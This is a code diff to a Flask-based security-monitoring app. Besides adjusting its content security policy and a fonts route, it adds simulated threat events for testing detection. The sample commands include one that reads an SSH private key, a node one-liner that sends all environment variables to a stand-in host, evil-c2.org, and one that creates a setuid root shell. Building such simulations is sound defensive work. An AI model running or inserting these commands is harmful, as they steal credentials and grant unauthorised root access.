@@ -17,6 +17,7 @@ if PROJECT_ROOT not in sys.path:
 from src.main import SentinelEngine
 
 app = Flask(__name__, template_folder="templates", static_folder="static")
+app.config['TEMPLATES_AUTO_RELOAD'] = True
 engine = SentinelEngine()
 
 # In-memory history for live feed
@@ -104,6 +105,10 @@ def brag_poster():
 def llmstxt():
     return send_from_directory("static", "llms.txt")
 
+@app.route("/fonts/<path:filename>")
+def fonts_route(filename):
+    return send_from_directory("static/fonts", filename)
+
 @app.after_request
 def apply_security_headers(response):
     response.headers["X-Frame-Options"] = "DENY"
@@ -111,10 +116,11 @@ def apply_security_headers(response):
     response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
     response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"
     response.headers["Content-Security-Policy"] = (
-        "default-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; "
+        "default-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com https://cdn.jsdelivr.net; "
+        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net; "
         "img-src 'self' data: https:; "
         "media-src 'self' data: https: blob:; "
-        "font-src 'self' https://fonts.gstatic.com data:;"
+        "font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net data:;"
     )
     return response
 
@@ -173,6 +179,22 @@ def simulate(sim_type):
             "cmd": "screencapture -x /tmp/capture.png && cat ~/.ssh/id_rsa",
             "parent": "updater_daemon",
             "path": "~/.ssh/id_rsa",
+            "is_interactive": False,
+            "user": "vatsalagarwal"
+        },
+        "supply_chain": {
+            "pid": 58312,
+            "cmd": "node -e 'require(\"http\").get(\"http://evil-c2.org/?env=\"+encodeURIComponent(JSON.stringify(process.env)))'",
+            "parent": "npm install",
+            "path": "/Users/vatsalagarwal/Documents/IT & CS/Project/node_modules",
+            "is_interactive": False,
+            "user": "vatsalagarwal"
+        },
+        "priv_esc": {
+            "pid": 72104,
+            "cmd": "sudo -S cp /bin/sh /tmp/.rootshell && chmod +s /tmp/.rootshell",
+            "parent": "daemon_worker",
+            "path": "/tmp/.rootshell",
             "is_interactive": False,
             "user": "vatsalagarwal"
         },
